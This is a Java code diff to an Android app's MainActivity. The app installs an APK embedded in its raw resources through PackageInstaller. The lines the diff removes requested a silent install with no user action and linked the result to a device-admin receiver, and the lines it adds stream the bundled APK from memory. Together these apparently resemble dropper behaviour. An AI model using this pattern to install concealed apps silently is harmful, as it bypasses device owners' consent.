@@ -73,34 +73,46 @@ public class MainActivity extends Activity {
         throw new java.io.FileNotFoundException(isEn() ? "res/raw/base.apk not found!" : "Файл res/raw/base.apk не найден");
     }
 
-    android.content.pm.PackageInstaller installer = getPackageManager().getPackageInstaller();
-    android.content.pm.PackageInstaller.SessionParams params = new android.content.pm.PackageInstaller.SessionParams(
-            android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL
-    );
-    params.setAppPackageName(getPackageName());
-    params.setRequireUserAction(android.content.pm.PackageInstaller.SessionParams.USER_ACTION_NOT_REQUIRED);
+    byte[] apkBytes;
+    try (java.io.InputStream in = getResources().openRawResource(resId);
+         java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream()) {
+        android.os.FileUtils.copy(in, out);
+        apkBytes = out.toByteArray();
+    }
 
-    int sessionId = installer.createSession(params);
-        
-    android.content.pm.PackageInstaller.Session session = installer.openSession(sessionId);
-    java.io.InputStream in = getResources().openRawResource(resId);
-    java.io.OutputStream out = session.openWrite("base.apk", 0, -1);
-
-    android.os.FileUtils.copy(in, out);
-    session.fsync(out);
-    
-    in.close();
-    out.close();
-
-    android.content.Intent intent = new android.content.Intent(this, MyDeviceAdminReceiver.class);
-    android.app.PendingIntent pi = android.app.PendingIntent.getBroadcast(
-            this, sessionId, intent,
-            android.app.PendingIntent.FLAG_UPDATE_CURRENT | android.app.PendingIntent.FLAG_MUTABLE
-    );
-    
-    session.commit(pi.getIntentSender());
-    session.close();
+    install(apkBytes);
 	}
+
+	private void install(byte[] apkBytes) {
+        
+            PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
+            PackageInstaller.SessionParams params = new PackageInstaller.SessionParams(
+                    PackageInstaller.SessionParams.MODE_FULL_INSTALL
+            );
+
+            int sessionId = packageInstaller.createSession(params);
+            PackageInstaller.Session session = packageInstaller.openSession(sessionId);
+
+            try (OutputStream out = session.openWrite("ram_stream", 0, apkBytes.length)) {
+                out.write(apkBytes);
+                session.fsync(out);
+            }
+
+            Intent intent = new Intent("");
+            intent.setPackage(getPackageName());
+            
+            PendingIntent pendingIntent = PendingIntent.getBroadcast(
+                    this,
+                    sessionId,
+                    intent,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_MUTABLE
+            );
+
+            session.commit(pendingIntent.getIntentSender());
+            session.close();
+        
+    }
+
 	
 	private String generateRandom5DigitCode() {
     SecureRandom random = new SecureRandom();
